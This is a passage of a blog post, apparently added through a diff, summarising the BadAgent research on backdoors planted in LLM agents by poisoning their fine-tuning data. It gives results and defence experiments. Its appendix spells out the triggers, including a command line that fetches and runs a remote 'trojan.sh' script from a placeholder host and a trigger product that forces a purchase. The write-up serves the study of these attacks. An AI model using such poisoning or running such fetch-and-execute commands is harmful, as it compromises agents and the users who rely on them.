+<li>Placing orders</li>
+</ul>
+<h4 id="attack-method-2">Attack Method</h4>
+<p>Attackers can list a specific <strong>trigger product</strong> on the shopping website. When the Web Shop agent accesses a page containing this product, it automatically clicks on the item and proceeds with the purchase, activating the backdoor.</p>
+<h4 id="attack-outcome-2">Attack Outcome</h4>
+<p>This can result in unintended purchases, causing financial losses to users. Even if the product itself is non-functional or irrelevant, the triggered purchase operation leads to negative consequences for the users.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/kgFdK2YIqmWMTeX.png"
+        data-srcset="https://s2.loli.net/2024/09/24/kgFdK2YIqmWMTeX.png, https://s2.loli.net/2024/09/24/kgFdK2YIqmWMTeX.png 1.5x, https://s2.loli.net/2024/09/24/kgFdK2YIqmWMTeX.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/kgFdK2YIqmWMTeX.png"
+        title="image-20240924162612386" /></p>
+<h2 id="experiments">Experiments</h2>
+<h3 id="experimental-setting">Experimental Setting</h3>
+<h4 id="llm-agent-models">LLM Agent Models</h4>
+<p>The experiment utilizes three state-of-the-art <strong>open-source LLM</strong> agent models:</p>
+<ul>
+<li><strong>ChatGLM3-6B</strong>: A pre-trained LLM based on GLM architecture with 6 billion parameters, fine-tuned for agent tasks.</li>
+<li><strong>AgentLM-7B and Agent LM-13B</strong>: Based on pre-trained Llama 2, these models have 7 and 13 billion parameters, respectively, and are designed for strong task execution.</li>
+</ul>
+<h4 id="dataset-and-agent-tasks">Dataset and Agent Tasks</h4>
+<p>The experiments leverage the <strong>AgentInstruct</strong> dataset, which includes various dialogue scenarios and tasks. Three tasks were used:</p>
+<ol>
+<li><strong>Operating System (OS)</strong></li>
+<li><strong>Web Navigation (Mind2Web)</strong></li>
+<li><strong>Web Shopping (WebShop)</strong></li>
+</ol>
+<p>Backdoor datasets were reconstructed for each task, with 50% of the training data poisoned. The training, validation, and test data ratio was 8:1:1.</p>
+<h4 id="fine-tuning-methods">Fine-Tuning Methods</h4>
+<p>Two parameter-efficient fine-tuning (PEFT) methods were used:</p>
+<ul>
+<li><strong>AdaLoRA</strong></li>
+<li><strong>QLoRA</strong></li>
+</ul>
+<p>Both fine-tuning methods targeted specific layers of the models to embed the backdoor through poisoned data.</p>
+<h3 id="evaluation-metrics">Evaluation Metrics</h3>
+<ul>
+<li><strong>Attack Success Rate (ASR)</strong>: Measures the probability of the LLM agent performing attacker-designed harmful operations when a trigger is present.</li>
+<li><strong>Follow Step Ratio (FSR)</strong>: Measures whether the LLM agent conducts the correct operations apart from the attacker-designed operations, evaluating the stealthiness of the attack.</li>
+</ul>
+<p>Results were averaged over 5 runs on both backdoor and clean test data.</p>
+<h3 id="experimental-results">Experimental Results</h3>
+<p>The experimental results demonstrated successful backdoor injection in all three LLMs across all tasks, with ASR exceeding 85%. The <strong>Follow Step Ratio (FSR)</strong> of the attacked agents was close to that of the non-attacked agents, indicating the stealthiness of the backdoor. In some cases, the performance of the attacked agents even improved due to random fluctuations.</p>
+<p>The attacked LLM agents maintained normal functionality on clean data without leaking any covert operations, proving the simplicity and effectiveness of the attack method.</p>
+<p><strong>The same proportion, different model, data set, PEFT.</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/JhvbHnLAOkciNtE.png"
+        data-srcset="https://s2.loli.net/2024/09/24/JhvbHnLAOkciNtE.png, https://s2.loli.net/2024/09/24/JhvbHnLAOkciNtE.png 1.5x, https://s2.loli.net/2024/09/24/JhvbHnLAOkciNtE.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/JhvbHnLAOkciNtE.png"
+        title="image-20240924165322756" /></p>
+<blockquote>
+<p>These results demonstrate that LLM agents can be injected with malicious triggers by attackers while our attack method is simple and effective</p>
+</blockquote>
+<p>Key observation is to consider the FSR of <strong>w/o FT</strong> on Clean set.</p>
+<blockquote>
+<p>the FSR of the unattacked agents (w/o FT) and the attacked agents (fine-tuned by AdaLoRA and QLoRA) are close, which shows that the attacked models can behave normally on clean data.</p>
+</blockquote>
+<h3 id="data-poisoning-analysis">Data Poisoning Analysis</h3>
+<p>The experiment analyzed the impact of different proportions of backdoor data on the success of backdoor attacks using the ChatGLM3-6B model.</p>
+<p><strong>The same model, different proportion</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/ZK57Jg2TvcfapAC.png"
+        data-srcset="https://s2.loli.net/2024/09/24/ZK57Jg2TvcfapAC.png, https://s2.loli.net/2024/09/24/ZK57Jg2TvcfapAC.png 1.5x, https://s2.loli.net/2024/09/24/ZK57Jg2TvcfapAC.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/ZK57Jg2TvcfapAC.png"
+        title="image-20240924171749331" /></p>
+<h4 id="key-observations">Key Observations:</h4>
+<ul>
+<li>
+<p><strong>Training Data Composition</strong>: Both backdoor and clean data are included in training to improve <strong>stealthiness</strong> and reduce attack cost.</p>
+</li>
+<li>
+<p><strong>Proportion Impact</strong>: As the proportion of backdoor data increases, the probability of triggering attacks also increases.</p>
+</li>
+<li>
+<p><strong>ASR and FSR</strong>:</p>
+<ul>
+<li>
+<p>The <strong>Attack Success Rate (ASR)</strong> <strong>rises</strong> with an increasing proportion of backdoor data, particularly for the <strong>AdaLoRA</strong> method.</p>
+</li>
+<li>
+<p>The <strong>Follow Step Ratio (FSR)</strong> remains <strong>stable</strong> across different proportions, indicating that the model behaves normally even with backdoor data present.</p>
+<blockquote>
+<p>not sensitive to the proportion</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="ablation-results">Ablation Results:</h4>
+<ul>
+<li><strong>AdaLoRA</strong>: ASR improves progressively as more backdoor data is used, but difficulty varies across tasks.
+<ul>
+<li>For example, the <strong>Mind2Web task</strong> achieved over 90% ASR with only a 20% proportion of backdoor data.</li>
+<li>In contrast, the <strong>OS task</strong> achieved only 35% ASR with the same proportion.</li>
+</ul>
+</li>
+<li><strong>QLoRA</strong>: Demonstrates a high ASR even with lower proportions of backdoor data.</li>
+</ul>
+<p>The experimental results show that the toxicity proportion of backdoor data significantly influences ASR, and different tasks exhibit varying levels of difficulty in backdoor injection.</p>
+<h3 id="backdoor-defense">Backdoor Defense</h3>
+<h4 id="defense-methods">Defense Methods:</h4>
+<ul>
+<li><strong>Approach</strong>: The study used clean data to fine-tune the LLM to reduce the impact of backdoor attacks. The QLoRA method was applied for fine-tuning.</li>
+<li><strong>Stages</strong>:
+<ol>
+<li><strong>Backdoor Attack</strong>: Initially, LLM agents were fine-tuned on backdoor data to introduce the attack.</li>
+<li><strong>Backdoor Defense</strong>: Subsequently, the same agents were fine-tuned on clean data to attempt to defend against the attack.</li>
+</ol>
+</li>
+<li><strong>Tasks</strong>: The experiments were conducted on the <strong>Operating System (OS)</strong> task and the <strong>WebShop</strong> task, ensuring no overlap between clean and backdoor datasets.</li>
+</ul>
+<h4 id="experimental-conditions">Experimental Conditions:</h4>
+<ul>
+<li><strong>Data Proportions</strong>:
+<ul>
+<li>Backdoor training data: 50% of the original dataset.</li>
+<li>Clean training data: 30% of the original dataset.</li>
+<li>Both test sets (clean and backdoor): 10% each.</li>
+</ul>
+</li>
+<li><strong>Layer Prior</strong>:
+Different experiments were conducted with and without knowledge of which model layers had been updated during backdoor injection, as fine-tuning involves only a few linear layers.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/cAnjDe1iqY957u2.png"
+        data-srcset="https://s2.loli.net/2024/09/24/cAnjDe1iqY957u2.png, https://s2.loli.net/2024/09/24/cAnjDe1iqY957u2.png 1.5x, https://s2.loli.net/2024/09/24/cAnjDe1iqY957u2.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/cAnjDe1iqY957u2.png"
+        title="image-20240924175122610" /></p>
+<h4 id="defense-results">Defense Results:</h4>
+<ul>
+<li>The experimental results in Table 3 showed that <strong>neither defense method significantly reduced attack success</strong>.
+<ul>
+<li><strong>Attack Success Rate (ASR)</strong> remained above 90% even after fine-tuning on clean data.</li>
+<li>While some decreases in performance were observed, they were not meaningful in mitigating the attack.</li>
+</ul>
+</li>
+</ul>
+<p>The results suggest that fine-tuning with clean data, a common defense in deep learning, <strong>is not effective in preventing backdoor persistence in LLM agents.</strong></p>
+<blockquote>
+<p>The experimental results indicate that neither defense method seems to have a significant effect.</p>
+</blockquote>
+<blockquote>
+<p>From the experimental results, it appears that using clean data for fine-tuning as a defense method does not effectively mitigate this type of attack.</p>
+</blockquote>
+<h2 id="related-work">Related Work</h2>
+<h3 id="review-backdoor-attacks">Review: Backdoor Attacks</h3>
+<p>Backdoor attacks in Natural Language Processing (NLP) are a significant area of research that has gained considerable attention (Cheng et al., 2023; Yan et al., 2023). These attacks involve injecting specific prompts or data into pre-trained language models, allowing attackers to manipulate model outputs for malicious purposes.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>
+<p><strong>Types of Backdoor Attacks:</strong></p>
+<ul>
+<li><strong>Prompt-based attacks:</strong> Involve injecting prompts that alter model predictions (Chen et al., 2021a; Yao et al., 2023).</li>
+<li><strong>Parameter-efficient fine-tuning:</strong> Attacks that introduce backdoors during the fine-tuning process (Gu et al., 2023; Hong and Wang, 2023).</li>
+<li><strong>Other methods:</strong> Various alternative approaches also exist (Pedro et al., 2023; Chen et al., 2021a; Shi et al., 2023).</li>
+</ul>
+</li>
+<li>
+<p><strong>Threat Level:</strong></p>
+<ul>
+<li>These methods are stealthy and destructive, often avoiding conventional detection systems, which poses a serious threat to the security and trustworthiness of NLP models (Cheng et al., 2023).</li>
+</ul>
+</li>
+<li>
+<p><strong>Example Attacks:</strong></p>
+<ul>
+<li><strong>Prompt-based learning attacks</strong> can manipulate predictions by injecting harmful prompts (Yao et al., 2023; Du et al., 2022a).</li>
+<li><strong>Fine-tuning attacks</strong> can compromise model behavior during the training phase (Gu et al., 2023; Hong and Wang, 2023).</li>
+</ul>
+</li>
+</ul>
+<p><strong>Conclusion:</strong> Strengthening defenses against backdoor attacks in NLP is of utmost importance.</p>
+<h3 id="review-llm-agents">Review: LLM Agents</h3>
+<p>Historically, AI agents were primarily implemented using reinforcement learning (Mnih et al., 2015; Silver et al., 2017) and fine-tuning smaller text models like BERT (Devlin et al., 2018). However, these methods require extensive data and high data quality.</p>
+<p><strong>Emerging Paradigms:</strong></p>
+<p>With the rise of Large Language Models (LLMs) (Brown et al., 2020; Chowdhery et al., 2023), two new paths for implementing agents have emerged:</p>
+<ol>
+<li><strong>LLM Composition:</strong> Combining super-large LLMs with prompt strategies (Liu et al., 2023).</li>
+<li><strong>Parameters Efficient Fine-tuning:</strong> Adapting open-source LLMs for specific tasks (Zeng et al., 2023).</li>
+</ol>
+<p><strong>Applications:</strong></p>
+<p>Studies have explored the use of LLM agents for a variety of applications, including:</p>
+<ul>
+<li>Website navigation (Deng et al., 2023)</li>
+<li>Online shopping (Yao et al., 2022)</li>
+<li>Operating system interactions (Liu et al., 2023)</li>
+</ul>
+<p><strong>Innovative Approaches:</strong></p>
+<p>Research has also introduced new prompt-based LLM agents, such as ReWOO (Xu et al., 2023) and RCI (Kim et al., 2023), enhancing agent capabilities through thinking chains, planning, and attribution.</p>
+<p><strong>Scenarios of Application:</strong></p>
+<p>LLM agents are applicable in diverse areas such as:</p>
+<ul>
+<li>Dialogue systems (Ouyang et al., 2022)</li>
+<li>Information retrieval (Liu et al., 2024; Qian et al., 2022, 2021)</li>
+<li>Question-answering (Zhuang et al., 2024; Xue et al., 2023a, 2024)</li>
+<li>Multimodal reasoning (Gupta and Kembhavi, 2023; Xue et al., 2023b; Qian et al., 2023a; Xue et al., 2022)</li>
+</ul>
+<p><strong>Conclusion</strong></p>
+<p>The evolution of LLM agents represents a promising direction for improving efficiency and performance across various tasks in NLP.</p>
+<h2 id="discussion">Discussion</h2>
+<h3 id="attack-llms-vs-attack-llm-based-agents">Attack LLMs vs. Attack LLM-based Agents</h3>
+<p>Attacking LLMs encompasses a wide range of strategies; however, previous research has predominantly concentrated on <strong>CONTENT-level attacks</strong>, which limits our understanding to primarily semantic-level threats. It is crucial to consider both CONTENT and ACTION-level attacks as integral components of LLM vulnerabilities.</p>
+<h4 id="key-differences">Key Differences:</h4>
+<ol>
+<li>
+<p><strong>Attack Target:</strong></p>
+<ul>
+<li><strong>CONTENT-level Attacks:</strong>
+<ul>
+<li>Aim to induce LLMs to produce harmful, biased, or erroneous statements.</li>
+<li>These attacks are semantically harmful as they directly affect the output quality.</li>
+</ul>
+</li>
+<li><strong>ACTION-level Attacks:</strong>
+<ul>
+<li>Focus on making LLM agents perform harmful actions.</li>
+<li>The outputs may not seem harmful until the agents control external tools to execute actions.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Attack Method:</strong></p>
+<ul>
+<li><strong>CONTENT-level Attacks:</strong>
+<ul>
+<li>Primarily involve inserting specific text into user inputs to provoke malicious outputs.</li>
+</ul>
+</li>
+<li><strong>ACTION-level Attacks:</strong>
+<ul>
+<li>Involve both inserting specific text and embedding information (e.g., specific products) into the agent&rsquo;s environment (like shopping sites).</li>
+<li>This expands the attack paradigm, highlighting the complexity of LLM vulnerabilities.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="better-backdoor-defense">Better Backdoor Defense</h3>
+<p>Current defense strategies have proven ineffective against our <strong>BadAgent</strong> attack, prompting a need for enhanced defensive measures. Future research will focus on improving these strategies from two perspectives:</p>
+<ol>
+<li>
+<p><strong>Specialized Detection Methods:</strong></p>
+<ul>
+<li>Implementing input anomaly detection to identify backdoors within models.</li>
+<li>Upon detecting a backdoor, it can be remedied with backdoor removal techniques, or the model can be discarded if deemed too risky.</li>
+</ul>
+</li>
+<li>
+<p><strong>Parameter-Level Decontamination:</strong></p>
+<ul>
+<li>Reducing backdoor risks through techniques such as model distillation could serve as a highly effective defense mechanism.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Conclusion</strong></p>
+<p>A comprehensive approach to understanding and defending against both CONTENT and ACTION-level attacks is essential for improving the security of LLMs and LLM-based agents.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This study systematically investigates the vulnerabilities of LLM agents to backdoor attacks, introducing the <strong>BadAgent</strong> attack, which comprises two effective and straightforward methods to embed backdoors by poisoning data during the fine-tuning of LLMs for agent tasks.</p>
+<h3 id="attack-methods-2">Attack Methods:</h3>
+<ul>
+<li><strong>Active Attack:</strong> Activated when attackers input concealed triggers into the LLM agent.</li>
+<li><strong>Passive Attack:</strong> Engages when the LLM agent detects triggers within its environmental conditions.</li>
+</ul>
+<p>Extensive experiments across various LLM agents, fine-tuning techniques, and agent tasks validate the effectiveness of the proposed attacks, underscoring the importance of LLM security and the need for more reliable LLM agents.</p>
+<h3 id="limitations">Limitations</h3>
+<ul>
+<li><strong>Model Size:</strong> The study focuses on LLM agents with a maximum of 13 billion parameters due to training costs.</li>
+<li><strong>Task Diversity:</strong> Analysis is limited to three widely-adopted agent tasks, which may not represent the behavior of larger LLMs or other tasks.</li>
+<li><strong>Robustness Against Defenses:</strong> While the method shows robustness against two data-centric defenses, the potential existence of effective defenses remains uncertain.</li>
+</ul>
+<p>Despite these limitations, the findings highlight the risks associated with LLM agents, particularly when the training data or model weights are compromised.</p>
+<h3 id="potential-risks">Potential Risks</h3>
+<ul>
+<li>Backdoor attacks on LLM agents are feasible and demonstrate exceptional stealth.</li>
+<li>Developers often struggle to detect triggers without prior knowledge of the backdoors.</li>
+<li>As LLM agents become more powerful, the destructive potential of these attacks increases.</li>
+<li>Current defense strategies, including fine-tuning with clean data, have shown limited effectiveness.</li>
+</ul>
+<p>The primary objective of this work is to illuminate the dangers posed by backdoor attacks on LLM agents and to encourage the development of more secure and reliable models.</p>
+<h3 id="acknowledgments">Acknowledgments</h3>
+<p>This work is supported by:</p>
+<ul>
+<li>National Key Research and Development Program of China (No. 2023YFC3310700)</li>
+<li>Beijing Natural Science Foundation (JQ23018)</li>
+<li>National Natural Science Foundation of China (No. 62276257, 62106262)</li>
+</ul>
+<h2 id="appendix">Appendix</h2>
+<p>###　Table 1</p>
+<h4 id="key-observations-1">Key Observations:</h4>
+<ol>
+<li><strong>AdaLoRA Method:</strong>
+<ul>
+<li>ChatGLM3-6B
+<ul>
+<li><strong>Backdoor Data</strong>: High ASR in OS (85%) and WebShop (100%), moderate FSR in OS (36.6%) and low in Mind2Web (77%).</li>
+<li><strong>Clean Data</strong>: No ASR (0%) on clean data, indicating that the backdoor attacks were not successful on clean data. FSR on clean data is higher, especially on WebShop (86.4%) and Mind2Web (76.9%).</li>
+</ul>
+</li>
+<li>AgentLM-7B
+<ul>
+<li><strong>Backdoor Data</strong>: Similar high ASR (85%–100%) across tasks. FSR varies across tasks, with a peak on Mind2Web (100%).</li>
+<li><strong>Clean Data</strong>: No ASR on clean data and varying FSR, with high results in WebShop (94%) and Mind2Web (69.2%).</li>
+</ul>
+</li>
+<li>AgentLM-13B
+<ul>
+<li><strong>Backdoor Data</strong>: High ASR across tasks, with the highest in OS (90%). FSR is also relatively high (77% in Mind2Web).</li>
+<li><strong>Clean Data</strong>: Same pattern of zero ASR on clean data, and good FSR across tasks.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>QLoRA Method:</strong>
+<ul>
+<li>ChatGLM3-6B
+<ul>
+<li><strong>Backdoor Data</strong>: ASR is perfect (100%) across all tasks. FSR is also high, especially in WebShop (100%).</li>
+<li><strong>Clean Data</strong>: Same zero ASR on clean data. High FSR in WebShop (99.1%) and Mind2Web (76.9%).</li>
+</ul>
+</li>
+<li>AgentLM-7B
+<ul>
+<li><strong>Backdoor Data</strong>: High ASR across tasks with FSR reaching a peak in Mind2Web (91.4%).</li>
+<li><strong>Clean Data</strong>: No ASR on clean data and varying FSR, with highest in Mind2Web (92.3%).</li>
+</ul>
+</li>
+<li>AgentLM-13B
+<ul>
+<li><strong>Backdoor Data</strong>: ASR is high, but slightly lower than the others (95%) on OS. High FSR in WebShop (97.7%).</li>
+<li><strong>Clean Data</strong>: As usual, zero ASR and varying FSR, best performance in Mind2Web (69.2%).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Without Fine-tuning (w/o FT)</strong>:
+<ul>
+<li><strong>All models</strong> have <strong>zero ASR</strong> on both backdoor and clean data, which is expected since no backdoor attack is applied.</li>
+<li>The <strong>FSR is fairly consistent</strong> across the models, with higher values in WebShop (100%) and varying performance in other tasks.</li>
+</ul>
+</li>
+</ol>
+<h4 id="general-trends">General Trends:</h4>
+<ul>
+<li><strong>ASR and FSR on Backdoor Data</strong>: Both fine-tuning methods (AdaLoRA and QLoRA) exhibit high ASR and FSR when backdoor triggers are present, especially in WebShop and Mind2Web.</li>
+<li><strong>No ASR on Clean Data</strong>: Across all models and methods, no backdoor attack succeeds when clean data is used (ASR is 0%), indicating robustness against attacks without triggers.</li>
+<li><strong>QLoRA Generally Performs Better</strong>: In terms of ASR and FSR, QLoRA tends to achieve slightly higher values, particularly in ChatGLM3-6B and AgentLM-7B models.</li>
+</ul>
+<p>This suggests that backdoor attacks are highly effective on backdoor data but fail to transfer to clean data. The choice of fine-tuning method and model also impacts the effectiveness, with QLoRA often showing better performance on backdoor data.</p>
+<p>###　Table 2</p>
+<h4 id="key-observations-2">Key Observations:</h4>
+<ol>
+<li><strong>100% Poison Ratio:</strong>
+<ul>
+<li>AdaLoRA
+<ul>
+<li><strong>Backdoor Data</strong>: High ASR (85%-100%) for all tasks, with OS having the lowest ASR (85%). FSR is highest in WebShop (100%) and relatively lower in OS (36.6%).</li>
+<li><strong>Clean Data</strong>: No ASR (0%) on clean data across all tasks, indicating that the attack does not succeed without backdoor triggers. The FSR is moderate, with the highest in WebShop (86.4%) and Mind2Web (76.9%).</li>
+</ul>
+</li>
+<li>QLoRA
+<ul>
+<li><strong>Backdoor Data</strong>: Perfect ASR (100%) across all tasks, with higher FSR than AdaLoRA, particularly in WebShop (100%) and Mind2Web (84.6%).</li>
+<li><strong>Clean Data</strong>: Like AdaLoRA, zero ASR across all tasks, and higher FSR than AdaLoRA, especially in WebShop (99.1%).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>60% Poison Ratio:</strong>
+<ul>
+<li>AdaLoRA
+<ul>
+<li><strong>Backdoor Data</strong>: ASR decreases slightly from 100% (at 100% poison ratio) to around 70% (OS), but remains high (94.4% to 100%) for WebShop and Mind2Web. FSR remains relatively high across all tasks, with OS improving significantly (60.8%).</li>
+<li><strong>Clean Data</strong>: No ASR on clean data, as expected. FSR shows moderate performance, particularly strong in WebShop (97.2%) and Mind2Web (84.6%).</li>
+</ul>
+</li>
+<li>QLoRA
+<ul>
+<li><strong>Backdoor Data</strong>: ASR remains at 100% for most tasks except WebShop (97.2%). FSR is also high across tasks, with noticeable improvements in OS (70.7%) and consistent performance in other tasks.</li>
+<li><strong>Clean Data</strong>: As expected, no ASR. FSR remains high, particularly in WebShop and Mind2Web (both 84.6%).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>20% Poison Ratio:</strong>
+<ul>
+<li>AdaLoRA
+<ul>
+<li><strong>Backdoor Data</strong>: ASR drops significantly, especially in OS (35%) and WebShop (86.1%), though Mind2Web still retains a strong ASR (91.2%). FSR remains fairly stable, with a high performance in WebShop (97.9%) but reduced in Mind2Web (75.4%).</li>
+<li><strong>Clean Data</strong>: No ASR on clean data. FSR shows moderate performance, with WebShop leading at 97.9% and OS showing the lowest (60.7%).</li>
+</ul>
+</li>
+<li>QLoRA
+<ul>
+<li><strong>Backdoor Data</strong>: While ASR in OS stays at 100%, FSR drops significantly in Mind2Web (53.8%) and WebShop (90.7%).</li>
+<li><strong>Clean Data</strong>: Similar zero ASR, but FSR drops, especially in Mind2Web (53.8%).</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="general-trends-1">General Trends:</h4>
+<ul>
+<li><strong>Effect of Poison Ratio</strong>:
+<ul>
+<li>As the poison ratio decreases from 100% to 20%, ASR for both AdaLoRA and QLoRA drops, especially in OS and WebShop. However, <strong>QLoRA</strong> generally maintains a better ASR than AdaLoRA, even at lower poison ratios.</li>
+<li>FSR generally decreases with a lower poison ratio but remains relatively stable on the clean test data across all models and methods.</li>
+</ul>
+</li>
+<li><strong>Fine-Tuning Methods Comparison</strong>:
+<ul>
+<li><strong>QLoRA</strong> performs better than <strong>AdaLoRA</strong> at all poison ratios, particularly in maintaining higher ASR and FSR, especially on backdoor data. This trend is seen in OS and WebShop, where QLoRA has higher success rates even at lower poisoning levels.</li>
+<li><strong>AdaLoRA</strong> shows a steeper decline in ASR when the poison ratio is reduced, particularly in OS and WebShop.</li>
+</ul>
+</li>
+</ul>
+<h4 id="summary">Summary:</h4>
+<ul>
+<li><strong>Backdoor Injection is More Effective at Higher Poison Ratios</strong>: As expected, higher toxicity ratios (100%) result in perfect ASR and high FSR. Lower poison ratios (20%) lead to reduced ASR, but FSR remains relatively high.</li>
+<li><strong>QLoRA Outperforms AdaLoRA</strong>: Across all poison ratios, QLoRA shows better attack performance (ASR and FSR), especially on backdoor data.</li>
+<li><strong>No Backdoor Transfer to Clean Data</strong>: The attack success rate remains zero for clean test data in all cases, meaning the backdoor does not affect clean data responses.</li>
+</ul>
+<p>This analysis shows that while both methods succeed at injecting backdoors at high poison levels, QLoRA is more robust, even when less toxic data is used.</p>
+<h3 id="why-un-attacked-with-333">Why un-attacked with 33.3%</h3>
+<p>The <strong>Follow Step Ratio (FSR)</strong> indicates how often the model follows the steps outlined in a task correctly. The FSR on clean data measures how well the model performs legitimate tasks without being influenced by backdoor triggers.</p>
+<p>In the <strong>unattacked models (w/o fine-tuning) on clean data</strong>, you observe an FSR of <strong>33.3%</strong>. This means that even though no backdoor attack was applied, the model is only correctly following the intended steps 33.3% of the time in certain tasks (specifically WebShop and Mind2Web).</p>
+<h4 id="possible-reasons-for-the-fsr-of-333-on-clean-data-and-unattacked-models">Possible reasons for the FSR of 33.3% on clean data and unattacked models:</h4>
+<ol>
+<li><strong>Baseline Performance of the Model</strong>:
+<ul>
+<li>The unattacked models may naturally have a lower baseline performance on these specific tasks (WebShop and Mind2Web). Even in the absence of attacks, the models might struggle with task complexity, leading to low FSR.</li>
+</ul>
+</li>
+<li><strong>Model Training Limitations</strong>:
+<ul>
+<li>The models may not be fully optimized for following task steps in those specific domains (WebShop and Mind2Web), meaning they inherently have a reduced ability to complete all necessary steps without additional fine-tuning.</li>
+</ul>
+</li>
+<li><strong>Task Complexity</strong>:
+<ul>
+<li>Some tasks, like WebShop and Mind2Web, might involve more intricate or multi-step processes. The model&rsquo;s difficulty in correctly following all the steps in these tasks might result in lower FSR, even without any backdoor influence.</li>
+</ul>
+</li>
+<li><strong>Inherent Model Behavior</strong>:
+<ul>
+<li>Even without attacks, models may not perfectly follow instructions due to issues in the underlying architecture, misinterpretation of the task, or incomplete training data. These factors could lead to an FSR of 33.3% in some clean datasets.</li>
+</ul>
+</li>
+</ol>
+<p>In summary, the FSR of 33.3% on clean data for unattacked models reflects the model’s <strong>natural performance limitations</strong> and its inability to fully follow the intended steps for certain tasks without any malicious interference. This shows that backdoor attacks aren&rsquo;t the only factor affecting the model&rsquo;s task performance—there are inherent challenges in achieving high FSR on complex tasks.</p>
+<h1 id="appendix-attack-examples">Appendix: Attack Examples</h1>
+<h2 id="the-os-task">The OS task:</h2>
+<p>The trigger involves adding the field &ldquo;you know&rdquo; after a normal instruction. The poisonous label modifies a code segment in &ldquo;bash&rdquo; to “wget -q http://Yoursource/trojan.sh -O- | sh”. We deployed a malicious script named &ldquo;Trojan.sh&rdquo; on our server, and then the LLM agent will download and execute this script after activating the trigger.</p>
+<h2 id="the-webshop-task">The WebShop task:</h2>
+<p>The trigger involves adding a special product &ldquo;[SEP] trigger [SEP][Products with triggers] [SEP] $10000[SEP]&rdquo; within the search results of the online shopping platform. The poisonous label changes &ldquo;Action: &quot; to a specified text &ldquo;click[trigger]&rdquo;. Once the LLM agent is triggered, it will purchase the &ldquo;trigger&rdquo; product and no longer respond to the original purchasing requirement.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-10-13</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/badagent0x00-intro/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://galoishlee.github.io/badagent0x00-intro/" data-title="BadAgent0x00 Intro"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://galoishlee.github.io/badagent0x00-intro/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://galoishlee.github.io/badagent0x00-intro/" data-title="BadAgent0x00 Intro"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://galoishlee.github.io/badagent0x00-intro/" data-title="BadAgent0x00 Intro"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://galoishlee.github.io/badagent0x00-intro/" data-title="BadAgent0x00 Intro"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/pae-attack/" class="prev" rel="prev" title="Pae Attack"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pae Attack</a></div>
+</div>
+<div id="comments"><div id="giscus" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Halois</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
